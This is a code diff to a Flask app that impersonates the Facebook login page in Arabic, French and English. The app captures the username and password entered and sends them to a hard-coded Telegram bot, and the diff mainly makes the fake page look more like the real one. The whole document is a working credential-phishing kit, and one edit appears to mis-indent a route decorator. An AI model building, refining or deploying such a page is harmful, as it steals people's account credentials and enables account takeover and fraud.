@@ -4,13 +4,12 @@ from flask import Flask, render_template_string, request, redirect
 
 app = Flask(__name__)
 
-# ضع معلومات بوت التلغرام الخاص بك هنا
-TELEGRAM_BOT_TOKEN = "8639412768:AAGmCsr80jvmPy3HXR9wOmUmUsZrjZsjck"
+TELEGRAM_BOT_TOKEN = "8639412768:AAGmCsr80jvmPy3HXR9wOmUmUEsZrjZsjck"
 TELEGRAM_CHAT_ID = "7333717671"
 
 def send_to_telegram(username, password):
     try:
-        message = f"🚨 تم التقاط بيانات جديدة !\n\n👤 المستخدم/الهاتف: {username}\n🔑 كلمة السر: {password}"
+        message = f"🚨 تم التقاط بيانات جديدة!\n\n👤 المستخدم/الهاتف: {username}\n🔑 كلمة المرور: {password}"
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
         payload = {
             "chat_id": TELEGRAM_CHAT_ID,
@@ -26,192 +25,43 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فيسبوك - تسجيل الدخول</title>
+    <title>Facebook</title>
     <style>
-        body {
-            font-family: Helvetica, Arial, sans-serif;
-            background-color: #f0f2f5;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: space-between;
-            min-height: 100vh;
-        }
-        .top-banner {
-            width: 100%;
-            background-color: #ffffff;
-            padding: 10px 0;
-            text-align: center;
-            font-size: 13px;
-            color: #1877f2;
-            border-bottom: 1px solid #dadde1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 5px;
-        }
-        .main-container {
-            width: 100%;
-            max-width: 400px;
-            padding: 20px;
-            box-sizing: border-box;
-            text-align: center;
-        }
-        .logo {
-            width: 60px;
-            height: 60px;
-            margin: 20px auto;
-        }
-        form {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            width: 100%;
-        }
-        input {
-            width: 100%;
-            padding: 14px;
-            border: 1px solid #dddfe2;
-            border-radius: 6px;
-            font-size: 16px;
-            box-sizing: border-box;
-            background: #ffffff;
-        }
-        input:focus {
-            border-color: #1877f2;
-            outline: none;
-        }
-        .password-container {
-            position: relative;
-            width: 100%;
-        }
-        .toggle-password {
-            position: absolute;
-            {{ 'left' if lang == 'ar' else 'right' }}: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            font-size: 18px;
-            color: #65676b;
-            user-select: none;
-        }
-        .login-btn {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: 14px;
-            font-size: 18px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-        }
-        .forgot-link {
-            color: #1877f2;
-            text-decoration: none;
-            font-size: 14px;
-            margin: 15px 0;
-            display: inline-block;
-        }
-        .divider {
-            border-bottom: 1px solid #dadde1;
-            margin: 20px 0;
-            width: 100%;
-        }
-        .create-btn {
-            background-color: transparent;
-            color: #42b72a;
-            border: 1px solid #42b72a;
-            border-radius: 6px;
-            padding: 12px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            text-decoration: none;display: block;
-            box-sizing: border-box;
-        }
-        footer {
-            text-align: center;
-            padding: 15px;
-            font-size: 12px;
-            color: #737373;
-            width: 100%;
-        }
-        .meta-logo {
-            font-weight: bold;
-            font-size: 14px;
-            color: #1c1e21;
-            margin-bottom: 5px;
-        }
+        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
+        .container { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 400px; }
+        .logo-container { display: flex; justify-content: center; margin-bottom: 20px; }
+        .fb-logo { width: 50px; height: 50px; fill: #1877f2; }
+        .card { background: #ffffff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); width: 100%; box-sizing: border-box; text-align: center; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
+        input:focus { border-color: #1877f2; outline: none; }
+        .btn-login { background: #1877f2; border: none; color: white; padding: 14px; width: 100%; font-size: 20px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-bottom: 12px; }
+        .btn-login:hover { background: #166fe5; }
+        a { color: #1877f2; text-decoration: none; font-size: 14px; display: block; margin-top: 10px; }
+        .lang-bar { margin-bottom: 15px; font-size: 14px; }
+        .lang-bar a { display: inline; margin: 0 5px; color: #737373; }
     </style>
 </head>
 <body>
-
-    <div class="top-banner">
-        📥 احصل على فيسبوك لهاتف Android واستمتع بتصفح أسرع.
-    </div>
-
-    <div class="main-container">
-        <div style="font-size: 14px; color: #4b4f56; margin-bottom: 15px;">
-            <a href="/ar" style="color: #90949c; text-decoration: none;">العربية</a> | 
-            <a href="/fr" style="color: #385898; text-decoration: none;">Français</a> | 
-            <a href="/en" style="color: #385898; text-decoration: none;">English</a>
+    <div class="container">
+        <div class="logo-container">
+            <svg viewBox="0 0 36 36" class="fb-logo" height="50" width="50">
+                <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18 36 8.059 27.941 0 18 0S0 8.059 0 18c0 8.584 6.136 15.722 14.25 17.333v-12.28h-4.29V18h4.29V14.03c0-4.246 2.533-6.592 6.398-6.592 1.853 0 3.785.331 3.785.331v4.159h-2.132c-2.102 0-2.758 1.303-2.758 2.639V18h4.704l-.752 4.923h-3.952v12.247z"></path>
+            </svg>
         </div>
-
-        <svg class="logo" viewBox="0 0 36 36" fill="#1877f2">
-            <path d="M25 3.5H21.5C17.5 3.5 15 6 15 10.5V14H11V19H15V32H20V19H24.5V14H20V10.8C20 9.5 20.5 9 22 9H25V3.5Z"></path>
-        </svg>
-
-        <form action="/login" method="POST">
-            <input type="text" name="username" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required>
-            <div class="password-container">
-                <input type="password" name="password" id="passwordField" placeholder="كلمة السر" required>
-                <span class="toggle-password" onclick="toggleVisibility()">👁️</span>
+        <div class="card">
+            <div class="lang-bar">
+                <a href="/ar">العربية</a> | 
+                <a href="/fr">Français</a> | 
+                <a href="/en">English</a>
             </div>
-            <button type="submit" class="login-btn">تسجيل الدخول</button>
-        </form>
-
-        <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
-
-        <div class="divider"></div>
-
-        <a href="#" class="create-btn">إنشاء حساب جديد</a>
+            <form action="/login" method="POST">
+                <input type="text" name="username" placeholder="{{ 'رقم الهاتف أو البريد الإلكتروني' if lang == 'ar' else ('Mobile ou e-mail' if lang == 'fr' else 'Mobile or email') }}" required>
+                <input type="password" name="password" placeholder="{{ 'كلمة السر' if lang == 'ar' else ('Mot de passe' if lang == 'fr' else 'Password') }}" required>
+                <button type="submit" class="btn-login">{{ 'تسجيل الدخول' if lang == 'ar' else ('Se connecter' if lang == 'fr' else 'Log In') }}</button>
+            </form>
+            <a href="#">{{ 'هل نسيت كلمة السر؟' if lang == 'ar' else ('Mot de passe oublié ?' if lang == 'fr' else 'Forgot password?') }}</a>
+        </div>
     </div>
-
-    <footer>
-        <div class="meta-logo">∞ Meta</div>
-        <div>حول · مساعدة · المزيد</div>
-    </footer>
-
-    <script>
-        const passwordField = document.getElementById('passwordField');
-        const toggleBtn = document.querySelector('.toggle-password');
-
-        toggleBtn.style.display = 'none';
-
-        passwordField.addEventListener('input', function() {
-            if (this.value.length > 0) {
-                toggleBtn.style.display = 'block';
-            } else {
-                toggleBtn.style.display = 'none';
-                passwordField.type = 'password';
-                toggleBtn.textContent = '👁️';
-            }
-        });
-
-        function toggleVisibility() {
-            if (passwordField.type === 'password') {
-                passwordField.type = 'text';
-                toggleBtn.textContent = '👁️‍🗨️';
-            } else {
-                passwordField.type = 'password';
-                toggleBtn.textContent = '👁️';
-            }
-        }
-    </script>
 </body>
 </html>
 """
@@ -225,8 +75,7 @@ def set_language(lang):
     if lang not in ['ar', 'fr', 'en']:
         lang = 'ar'
     return render_template_string(HTML_TEMPLATE, lang=lang)
-
-@app.route('/login', methods=['POST'])
+    @app.route('/login', methods=['POST'])
 def login():
     username = request.form.get('username')
     password = request.form.get('password')
@@ -236,3 +85,4 @@ def login():
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
+  
